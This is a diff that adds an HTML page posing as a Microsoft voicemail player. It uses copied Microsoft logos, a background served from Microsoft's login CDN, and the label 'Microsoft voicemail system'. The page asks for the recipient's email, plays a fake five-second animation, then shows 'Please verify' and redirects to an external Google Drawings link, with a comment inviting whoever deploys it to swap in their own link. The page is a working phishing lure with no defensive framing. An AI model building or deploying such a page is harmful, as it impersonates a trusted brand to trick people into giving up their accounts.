@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+  />
+  <title>Secure Voice Playback</title>
+  <!-- Content Security Policy -->
+  <meta
+    http-equiv="Content-Security-Policy"
+    content="
+      default-src 'self';
+      script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline';
+      style-src 'self' 'unsafe-inline';
+      img-src 'self' data: https://aadcdn.msftauth.net;
+      font-src 'self';
+      object-src 'none';
+      media-src 'self' blob:;
+      connect-src 'self' blob:;
+      upgrade-insecure-requests;
+    "
+  />
+  <!-- Howler.js for audio playback -->
+  <script
+    src="https://cdnjs.cloudflare.com/ajax/libs/howler/2.2.3/howler.min.js"
+    integrity="sha512-ZdS9EKTIZOrh3HQdqpWFWr6UWoKyZhDtB9xlpbsBiD8DjqUEvRIwguVx6DhXIFMRhwDkvzQjYUesVsraKCxZaw=="
+    crossorigin="anonymous"
+    referrerpolicy="no-referrer"
+  ></script>
+
+  <style>
+    body {
+      font-family: 'Segoe UI', 'Arial', sans-serif;
+      background-image: url("https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg");
+      background-size: cover;
+      background-position: center;
+      color: #ffffff;
+      height: 100vh;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      background: rgba(0, 0, 0, 0.7);
+      border-radius: 15px;
+      padding: 20px;
+      box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+      text-align: center;
+      max-width: 350px;
+      width: 90%;
+      position: relative;
+      overflow: hidden;
+    }
+    .logo {
+      width: 40px;
+      height: 40px;
+      margin: 0 auto 10px;
+    }
+    h1 {
+      font-size: 1.5em;
+      margin: 5px 0 15px;
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+    }
+    .email-input {
+      margin-bottom: 15px;
+    }
+    .email-input label {
+      display: block;
+      font-size: 0.9em;
+      margin-bottom: 5px;
+      text-align: left;
+      opacity: 0.8;
+    }
+    .email-input input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+      outline: none;
+    }
+    #playBtn {
+      font-size: 16px;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 50px;
+      background: #0078d4;
+      color: #fff;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 2px 8px 0 rgba(0, 0, 0, 0.2);
+    }
+    #playBtn:hover {
+      background: #106ebe;
+    }
+    #timer {
+      font-size: 2em;
+      margin-top: 15px;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    #systemLabel {
+      font-size: 0.9em;
+      margin-top: 0;
+      opacity: 0.8;
+    }
+    .wave {
+      width: 150px;
+      height: 40px;
+      display: flex;
+      justify-content: center;
+      align-items: flex-end;
+      margin: 15px auto;
+    }
+    .wave span {
+      width: 4px;
+      margin: 0 2px;
+      background: #ffffff;
+      animation: wave 1s infinite ease-in-out;
+    }
+    @keyframes wave {
+      0%,
+      100% {
+        height: 8px;
+      }
+      50% {
+        height: 32px;
+      }
+    }
+    .wave span:nth-child(2) {
+      animation-delay: 0.1s;
+    }
+    .wave span:nth-child(3) {
+      animation-delay: 0.2s;
+    }
+    .wave span:nth-child(4) {
+      animation-delay: 0.3s;
+    }
+    .wave span:nth-child(5) {
+      animation-delay: 0.4s;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Logo -->
+    <div class="logo" aria-label="Microsoft logo">
+      <svg
+        xmlns="http://www.w3.org/2000/svg"
+        viewBox="0 0 448 512"
+      >
+        <path fill="#F25022" d="M0 0h204.8v204.8H0V0z" />
+        <path fill="#7FBA00" d="M243.2 0H448v204.8H243.2V0z" />
+        <path fill="#00A4EF" d="M0 243.2h204.8V448H0V243.2z" />
+        <path fill="#FFB900" d="M243.2 243.2H448V448H243.2V243.2z" />
+      </svg>
+    </div>
+
+    <h1>Voice Playback</h1>
+
+    <!-- Email Input -->
+    <div class="email-input">
+      <label for="emailInput">Enter the email that received this voicemail</label>
+      <input type="email" id="emailInput" placeholder="user@example.com" required />
+    </div>
+
+    <!-- Play Button -->
+    <button id="playBtn" disabled>Play Voicemail</button>
+
+    <!-- Wave animation & timer -->
+    <div class="wave" style="display: none;">
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+    <p id="timer">0:00</p>
+    <p id="systemLabel">Microsoft voicemail system</p>
+  </div>
+
+  <script>
+    const playBtn = document.getElementById('playBtn');
+    const emailInput = document.getElementById('emailInput');
+    const timerDisplay = document.getElementById('timer');
+    const waveContainer = document.querySelector('.wave');
+
+    let timer;
+
+    // Enable the play button only if email is entered
+    emailInput.addEventListener('input', () => {
+      playBtn.disabled = !emailInput.value;
+    });
+
+    playBtn.addEventListener('click', function () {
+      waveContainer.style.display = 'flex';
+      startTimer(5, () => {
+        alert('Please verify');
+        window.location.href = 'https://docs.google.com/drawings/d/1-T6jfn7w8fMicbmLSz2RLgTkvH7VVFQgpgjThzjkl7s/preview?pli=1'; // Change to your desired link
+      });
+    });
+
+    function startTimer(duration, callback) {
+      let seconds = duration;
+      timer = setInterval(function () {
+        seconds--;
+        timerDisplay.textContent = `0:0${seconds}`;
+        if (seconds <= 0) {
+          clearInterval(timer);
+          waveContainer.style.display = 'none';
+          callback();
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
